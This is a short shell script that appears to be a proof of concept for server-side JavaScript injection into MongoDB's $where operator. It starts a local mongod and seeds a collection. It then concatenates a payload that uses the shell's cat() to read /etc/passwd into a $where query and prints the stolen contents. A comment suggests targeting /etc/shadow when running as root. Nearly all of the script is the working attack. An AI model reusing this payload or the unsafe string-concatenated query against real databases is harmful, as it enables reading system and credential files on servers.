pkill mongo

rm where.log*
rm -rf ./data/db
mkdir -p ./data/db

mongod --fork --logpath "where.log" --dbpath "./data/db"
sleep 2
echo """
db.getSiblingDB('public').publics.insert({entry: 'I am a public comment that can be found elsehow'})
print('public.publics:')
printjson(db.getSiblingDB('public').publics.findOne())
""" > initialData.js

echo "-------Initializing Data-------"
mongo --quiet initialData.js

# If running in root, try /etc/shadow Fur lolpwnz. Or just start grabing that hawt sauce
INJECTION="db.getSiblingDB('public').publics.insert({data: cat('/etc/passwd')})"

echo """
userInput = $INJECTION
db.getSiblingDB('public').publics.find({\$where: 'this.name == ' + userInput})

print('public.publics:')
cursor = db.getSiblingDB('public').publics.find()
while ( cursor.hasNext() ) {
   printjson( cursor.next() );
}
""" > serverScript.js

echo "---------Injecting Data!---------"
mongo --quiet serverScript.js